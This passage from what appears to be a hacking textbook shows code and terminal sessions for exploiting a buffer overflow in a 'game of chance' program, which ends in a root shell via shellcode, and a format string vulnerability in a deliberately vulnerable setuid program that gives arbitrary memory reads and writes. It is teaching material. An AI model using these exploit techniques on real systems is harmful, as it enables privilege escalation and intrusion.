Otherwise, choice was a game of some sort.\n\t      if(choice != last_game) { // If the function ptr isn't set,\n\t         if(choice == 1)        // then point it at the selected game \n\t            player.current_game = pick_a_number;\n\t         else if(choice == 2)\n\t            player.current_game = dealer_no_match;\n\t         else\n\t            player.current_game = find_the_ace;\n\t         last_game = choice;   // and set last_game.\n\t      }\n\t      play_the_game();   // Play the game.\n\t   }\n```", "```\nreader@hacking:~/booksrc $ ./game_of_chance \n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 70 credits] ->  1\n\n[DEBUG] current_game pointer @ 0x08048fde\n\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n\n10 credits have been deducted from your account.\nPick a number between 1 and 20: 5\nThe winning number is 17\nSorry, you didn't win.\n\nYou now have 60 credits\nWould you like to play again? (y/n)  n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n\n7 - Quit\n[Name: Jon Erickson]\n[You have 60 credits] ->\n[1]+  Stopped                 ./game_of_chance\nreader@hack ing:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gcc -g game_of_chance.c\nreader@hacking:~/booksrc $ gdb -q ./a.out \nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x8048813: file game_of_chance.c, line 41.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\n\nBreakpoint 1, main () at game_of_chance.c:41\n41         srand(time(0)); // Seed the randomizer with the current time.\n(gdb) p player\n$1 = {uid = 0, credits = 0, highscore = 0, name = '\\0' <repeats 99 times>, \ncurrent_game = 0}\n(gdb) x/x &player.name\n0x804b66c <player+12>:  0x00000000\n(gdb) x/x &player.current_game\n0x804b6d0 <player+112>: 0x00000000\n(gdb) p 0x804b6d0 - 0x804b66c\n$2 = 100\n(gdb) quit\nThe program is running.  Exit anyway? (y or n) y\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"A\"x100 . \"BBBB\" . \"\\n\"'\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAABBBB\nreader@hacking:~/booksrc $ fg\n./game_of_chance\n5\n\nChange user name\n\nEnter your new name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\nYour name has been changed.\n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]\n[You have 60 credits] ->  1\n\n[DEBUG] current_game pointer @ 0x42424242\nSegmentation fault \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ nm game_of_chance\n0804b508 d _DYNAMIC\n0804b5d4 d _GLOBAL_OFFSET_TABLE_\n080496c4 R _IO_stdin_used\n         w _Jv_RegisterClasses\n0804b4f8 d __CTOR_END__\n0804b4f4 d __CTOR_LIST__\n0804b500 d __DTOR_END__\n0804b4fc d __DTOR_LIST__\n0804a4f0 r __FRAME_END__\n0804b504 d __JCR_END__\n0804b504 d __JCR_LIST__\n0804b630 A __bss_start\n0804b624 D __data_start\n08049670 t __do_global_ctors_aux\n08048610 t __do_global_dtors_aux\n0804b628 D __dso_handle\n         w __gmon_start__\n08049669 T __i686.get_pc_thunk.bx\n0804b4f4 d __init_array_end\n0804b4f4 d __init_array_start\n080495f0 T __libc_csu_fini\n08049600 T __libc_csu_init\n         U __libc_start_main@@GLIBC_2.0\n0804b630 A _edata\n0804b6d4 A _end\n080496a0 T _f ini\n080496c0 R _fp_hw\n08048484 T _init\n080485c0 T _start\n080485e4 t call_gmon_start\n         U close@@GLIBC_2.0\n0804b640 b completed.1\n0804b624 W data_start\n080490d1 T dealer_no_match\n080486fc T dump\n080486d1 T ec_malloc\n         U exit@@GLIBC_2.0\n08048684 T fatal\n080492bf T find_the_ace\n08048650 t frame_dummy\n080489cc T get_player_data\n         U getuid@@GLIBC_2.0\n08048d97 T input_name\n08048d70 T jackpot\n08048803 T main\n         U malloc@@GLIBC_2.0\n         U open@@GLIBC_2.0\n0804b62c d p.0\n         U perror@@GLIBC_2.0\n08048fde T pick_a_number\n08048f23 T play_the_game\n0804b660 B player\n08048df8 T print_cards\n         U printf@@GLIBC_2.0\n         U rand@@GLIBC_2.0\n         U read@@GLIBC_2.0\n08048aaf T register_new_player\n         U scanf@@GLIBC_2.0\n08048c72 T show_highscore\n         U srand@@GLIBC_2.0\n         U strcpy@@GLIBC_2.0\n         U strncat@@GLIBC_2.0\n08048e91 T take_wager\n         U time@@GLIBC_2.0\n08048b72 T update_player_data\n         U write@@GLIBC_2.0 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n7\\nn\\n7\\n\"' | ./game_of_chance \n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 60 credits] ->  \n[DEBUG] current_game pointer @ 0x08048fde\n\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 20\nSorry, you didn't win.\n\nYou now have 50 credits\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 50 credits] ->  \nThanks for playing! Bye. \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\nn\\n\" . \"7\\n\"'\n1\n5\nn\n5\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAp?\n1\nn\n7\nreader@hack ing:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\nn\\n\" . \"7\\n\"' | ./game_of_chance \n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 50 credits] ->  \n[DEBUG] current_game pointer @ 0x08048fde\n\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 15\nSorry, you didn't win.\n\nYou now have 40 credits\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 40 credits] ->  \nChange user name\nEnter your new name: Your name has been changed.\n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 40 credits] ->\n\n[DEBUG] current_game po inter @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 140 credits\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 140 credits] ->  \nThanks for playing! Bye. \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\n\" . \"y\\n\"x10 . \"n\\n5\\nJon Erickson\\n7\\n\"' | ./\ngame_of_chance \n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 140 credits] ->\n[DEBUG] current_game pointer @ 0x08048fde\n\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 1\nSorry, you didn't win.\n\nYou now have 130 credits\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 130 credits] ->\nChange user name\nEnter your new name: Your name has been changed.\n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 130 credits] ->\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 230 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 330 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 430 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 530 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 630 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 730 credits\nWould you like to play aga in? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 830 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 930 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 1030 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 1130 credits\nWould you like to play again? (y/n)\n[DEBUG] current_game pointer @ 0x08048d70\n*+*+*+*+*+* JACKPOT *+*+*+*+*+*\nYou have won the jackpot of 100 credits!\n\nYou now have 1230 credits\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 1230 credits] ->\nChange user name\nEnter your new name: Your name has been changed.\n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n\n[Name: Jon Erickson]\n[You have 1230 credits] ->\nThanks for playing! Bye.\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat ./shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./game_of_chance\nSHELLCODE will be at 0xbffff9e0\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n7\\nn\\n5\\n\" . \"A\"x100 . \"\\xe0\\\nxf9\\xff\\xbf\\n\" . \"1\\n\"' > exploit_buffer\nreader@hacking:~/booksrc $ cat exploit_buffer - | ./game_of_chance \n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: Jon Erickson]\n[You have 70 credits] ->\n[DEBUG] current_game pointer @ 0x08048fde\n\n####### Pick a Number ######\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nwill win the jackpot of 100 credits!\n\n10 credits have been deducted from your account.\nPick a number between 1 and 20: The winning number is 2\nSorry, you didn't win.\n\nYou now have 60 credits\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n\n7 - Quit\n[Name: Jon Erickson]\n[You have 60 credits] ->  \nChange user name\nEnter your new name: Your name has been changed.\n\n-=[ Game of Chance Menu ]=-\n1 - Play the Pick a Number game\n2 - Play the No Match Dealer game\n3 - Play the Find the Ace game\n4 - View current high score\n5 - Change your user name\n6 - Reset your account at 100 credits\n7 - Quit\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]\n[You have 60 credits] ->  \n[DEBUG] current_game pointer @ 0xbffff9e0\n\nwhoami\nroot\nid\nuid=0(root) gid=999(reader)\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(\nplugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(re\nader)\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n   int A = 5, B = 7, count_one, count_two;\n\n   // Example of a %n format string\n   printf(\"The number of bytes written up to this point X%n is being stored in \ncount_one, and the number of bytes up to here X%n is being stored in \ncount_two.\\n\", &count_one, &count_two);\n\n   printf(\"count_one: %d\\n\", count_one);\n   printf(\"count_two: %d\\n\", count_two);\n\n   // Stack example\n   printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\n\n   exit(0); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc fmt_uncommon.c \nreader@hacking:~/booksrc $ ./a.out \nThe number of bytes written up to this point X is being stored in count_one, and the\n number of \nbytes up to here X is being stored in count_two.\ncount_one: 46\ncount_two: 113\nA is 5 and is at bffff7f4\\.  B is 7\\. \nreader@hacking:~/booksrc $\n```", "```\n\tprintf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\n```", "```\n\tprintf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A);\n```", "```\nreader@hacking:~/booksrc $ sed -e 's/, B)/)/' fmt_uncommon.c > fmt_uncommon2.c\nreader@hacking:~/booksrc $ diff fmt_uncommon.c fmt_uncommon2.c \n14c14\n<    printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\n---\n>       printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A);\nreader@hacking:~/booksrc $ gcc fmt_uncommon2.c \nreader@hacking:~/booksrc $ ./a.out\nThe number of bytes written up to this point X is being stored in count_one, and the\n number of \nbytes up to here X is being stored in count_two.\ncount_one: 46\ncount_two: 113\nA is 5 and is at bffffc24\\.  B is b7fd6ff4\\. \nreader@hacking:~/booksrc $\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n   char text[1024];\n   static int test_val = -72;\n\n   if(argc < 2) {\n      printf(\"Usage: %s <text to print>\\n\", argv[0]);\n      exit(0);\n   }\n   strcpy(text, argv[1]);\n\n   printf(\"The right way to print user-controlled input:\\n\");\n   printf(\"%s\", text);\n\n   printf(\"\\nThe wrong way to print user-controlled input:\\n\");\n   printf(text);\n\n   printf(\"\\n\");\n\n   // Debug output\n   printf(\"[*] test_val @ 0x%08x = %d 0x%08x\\n\", &test_val, test_val, \ntest_val);\n\n   exit(0);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o fmt_vuln fmt_vuln.c \nreader@hacking:~/booksrc $ sudo chown root:root ./fmt_vuln\nreader@hacking:~/booksrc $ sudo chmod u+s ./fmt_vuln\nreader@hacking:~/booksrc $ ./fmt_vuln testing\nThe right way to print user-controlled input:\ntesting\nThe wrong way to print user-controlled input:\ntesting\n[*] test_val @ 0x08049794 = -72 0xffffffb8 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln testing %x\nThe right way to print user-controlled input:\ntesting%x\nThe wrong way to print user-controlled input:\ntestingbffff3e0\n[*] test_val @ 0x08049794 = -72 0xffffffb8 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"%08x.\"x40')\nThe right way to print user-controlled input:\n%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\n.%08x.\n%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\n.%08x.\n%08x.%08x.\nThe wrong way to print user-controlled input:\nbffff320.b7fe75fc.00000000.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e\n.30252\ne78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e\n.30252e78.2\n52e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78\n.252e78\n38.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.\n[*] test_val @ 0x08049794 = -72 0xffffffb8 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ printf \"\\x25\\x30\\x38\\x78\\x2e\\n\"\n%08x. \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln AAAA%08x.%08x.%08x.%08x\nThe right way to print user-controlled input:\nAAAA%08x.%08x.%08x.%08x\nThe wrong way to print user-controlled input:\nAAAAbffff3d0.b7fe75fc.00000000.41414141\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ env | grep PATH\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nreader@hacking:~/booksrc $ ./getenvaddr PATH ./fmt_vuln\nPATH will be at 0xbffffdd7\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xd7\\xfd\\xff\\xbf\")%08x.%08x.%08x.%s\nThe right way to print user-controlled input:\n????%08x.%08x.%08x.%s\nThe wrong way to print user-controlled input:\n????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:\n/bin:/\nusr/games\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xd7\\xfd\\xff\\xbf\")%08x.%08x.%08x.%s\nThe right way to print user-controlled input:\n????%08x.%08x.%08x.%s\nThe wrong way to print user-controlled input:\n????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:\n/bin:/\nusr/games\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%08x.%08x.%08x.%n\nThe right way to print user-controlled input:\n??%08x.%08x.%08x.%n\nThe wrong way to print user-controlled input:\n??bffff3d0.b7fe75fc.00000000.\n[*] test_val @ 0x08049794 = 31 0x0000001f \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%x%n\nThe right way to print user-controlled input:\n??%x%x%x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc0\n[*] test_val @ 0x08049794 = 21 0x00000015\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%100x%n\nThe right way to print user-controlled input:\n??%x%x%100x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 120 0x00000078\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%180x%n\nThe right way to print user-controlled input:\n??%x%x%180x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 200 0x000000c8\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%400x%n\nThe right way to print user-controlled input:\n??%x%x%400x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 420 0x000001a4 \nreader@hacking:~/booksrc $\n```", "```\n`Memory                       94 95 96 97`\nFirst write to 0x08049794    AA 00 00 00\nSecond write to 0x08049795      BB 00 00 00\nThird write to 0x08049796          CC 00 00 00\nFourth write to 0x08049797            DD 00 00 00\n`Result                       AA BB CC DD`\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled input:\n??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc       0\n[*] test_val @ 0x08049794 = 28 0x0000001c\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xaa - 28 + 8\n$1 = 150\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%150x%n\nThe right way to print user-controlled input:\n??%x%x%150x%n\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 170 0x000000aa \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\\nx96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc       0\n[*] test_val @ 0x08049794 = 52 0x00000034\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xaa - 52 + 8\"\n$1 = 126\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\\nx96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%126x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%126x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc\n0\n[*] test_val @ 0x08049794 = 170 0x000000aa \nreader@hacking:~/booksrc $ \n```", "```\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xbb - 0xaa\"\n$1 = 17\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\\nx96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%126x%n%17x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n   0         4b4e554a\n[*] test_val @ 0x08049794 = 48042 0x0000bbaa \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcc - 0xbb\"\n$1 = 17\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xdd - 0xcc\"\n$1 = 17\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08JUNK\\x95\\x97\\x04\\x08JUNK\\\nx96\\\nx97\\x04\\x08JUNK\\x97\\x97\\x04\\x08\")%x%x%126x%n%17x%n%17x%n%17x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n%17x%n%17x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n   0         4b4e554a         4b4e554a         4b4e554a\n[*] test_val @ 0x08049794 = -573785174 0xddccbbaa \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ sed -e 's/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/\ng;x;G}'\nfmt_vuln.c > fmt_vuln2.c\nreader@hacking:~/booksrc $ diff fmt_vuln.c fmt_vuln2.c\n7c7\n<    static int test_val = -72;\n---\n> static int test_val = -72, next_val = 0x11111111;\n27a28\n> printf(\"[*] next_val @ 0x%08x = %d 0x%08x\\n\", &next_val, next_val, next_val);\nreader@hacking:~/booksrc $ gcc -o fmt_vuln2 fmt_vuln2.c \nreader@hacking:~/booksrc $ ./fmt_vuln2 test\nThe right way:\ntest\nThe wrong way:\ntest\n[*] test_val @ 0x080497b4 = -72 0xffffffb8\n[*] next_val @ 0x080497b8 = 286331153 0x11111111\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln2 AAAA%x%x%x%x\nThe right way to print user-controlled input:\nAAAA%x%x%x%x\nThe wrong way to print user-controlled input:\nAAAAbffff3d0b7fe75fc041414141\n[*] test_val @ 0x080497f4 = -72 0xffffffb8\n[*] next_val @ 0x080497f8 = 286331153 0x11111111\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcd - 5\"\n$1 = 200\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\\nxf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc       0\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $ \nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\\nxf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%8x%n\nThe right way to print user-controlled 